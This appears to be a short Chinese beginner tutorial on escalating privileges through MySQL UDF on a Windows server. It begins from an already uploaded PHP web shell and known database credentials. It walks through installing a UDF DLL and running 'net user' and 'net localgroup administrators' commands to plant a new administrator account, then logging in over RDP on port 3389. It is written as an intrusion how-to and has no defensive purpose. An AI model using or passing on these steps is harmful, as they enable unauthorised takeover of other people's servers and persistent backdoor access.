# MysqlUDF简单提权 小白思路

在已知用户名和密码的情况下，进行提权，本教程教的是一种方法，请灵活运用。只是讲一下思路，给小白顺一下思路。

  
![](../Images/15311f208ece3c9ae78a2f8766925589.png) 登录一下上传的 PHP shell，主要讲解的是如何提权，之前的步骤忽略不计。  
  
![](../Images/5c8c93b5ac152b8f7f0400881ca54adf.png)扫描一下端口，发现有3306，就是安装有mysql的数据库！  
  
![](../Images/c50877fce7b76bdce6690ec1f0c568a7.png) 输入已经得到的数据库的账号和密码，进行登录。连接，然后安装DLL。  
  
  
![](../Images/14e58cd1e6df62f9fd074c64a3515d9a.png)

  

![](../Images/f1ba7cb75efcd78f033764a9d64932c7.png)    
新建一个用户。  
net user 用户名 密码 /add  
并添加到管理员组。  
net localgroup administrators 用户 /add  
  
![](../Images/d26a7244d8c97d076ab4c2e4127675ba.png) 创建完成之后进入cmd命令，查看一下新建用户的是否创建成功，什么权限。  
net user  
  
![](../Images/ac5363955668eb9edd579697a2fe10cc.png) 查看一下开放的端口,发现有3389的开启。  
netstat -an  
  
![](../Images/130f13ea6ac5de01cd70a974f7983ac8.png) 

现在可以使用自己新建的管理员账户使用3389进行远程登录啦。  
  
![](../Images/0f77f12cb56a6b34b1ec76f03bdafce5.png)   
成功。
